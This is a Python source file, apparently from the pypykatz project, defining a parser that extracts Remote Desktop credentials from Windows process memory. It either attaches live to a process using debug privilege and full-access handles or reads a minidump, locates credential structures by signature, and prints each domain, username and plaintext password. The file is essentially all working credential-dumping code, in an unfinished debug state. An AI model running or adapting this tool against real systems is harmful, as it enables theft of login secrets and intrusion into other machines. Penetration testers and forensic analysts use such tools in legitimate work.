
import platform
from pypykatz import logger
from minidump.minidumpfile import MinidumpFile
from pypykatz.commons.common import KatzSystemInfo
from pypykatz.rdp.packages.creds.templates import RDPCredsTemplate
#from pypykatz.rdp.packages.creds.decryptor import RDPCredsDecryptor

class RDPCredParser:
	def __init__(self, reader, sysinfo):
		self.reader = reader
		self.sysinfo = sysinfo
	
	@staticmethod
	def go_live(pid):
		if platform.system() != 'Windows':
			raise Exception('Live parsing will only work on Windows')
		from pypykatz.common.live_reader_ctypes import OpenProcess, PROCESS_ALL_ACCESS
		from pypykatz.common.privileges import enable_debug_privilege
		from pypykatz.commons.readers.local.live_reader import LiveReader

		enable_debug_privilege()
		phandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
		reader = LiveReader(lsass_process_handle=phandle)
		sysinfo = KatzSystemInfo.from_live_reader(reader)
		mimi = RDPCredParser(reader.get_buffered_reader(), sysinfo)
		mimi.start()
		return mimi
	
	@staticmethod
	def parse_minidump_file(filename, chunksize = 10*1024):
		try:
			minidump = MinidumpFile.parse(filename)
			reader = minidump.get_reader().get_buffered_reader(segment_chunk_size=chunksize)
			print(reader.memory_segments)
			sysinfo = KatzSystemInfo.from_minidump(minidump)
		except Exception as e:
			logger.exception('Minidump parsing error!')
			raise e
		try:
			mimi = RDPCredParser(reader, sysinfo)
			mimi.start()
		except Exception as e:
			#logger.info('Credentials parsing error!')
			raise e
		return mimi

	def rdpcreds(self):
		print(self.reader.memory_segments)
		decryptor_template = RDPCredsTemplate.get_template(self.sysinfo)
		print(decryptor_template.signature)
		x = self.reader.find_all_global(decryptor_template.signature)
		print(x)
		for addr in x:
			self.reader.move(addr)
			cred = decryptor_template.cred_struct(self.reader)
			print(str(cred.Domain))
			print(str(cred.UserName))
			print(str(cred.Password))
			input()


	def start(self):
		self.rdpcreds()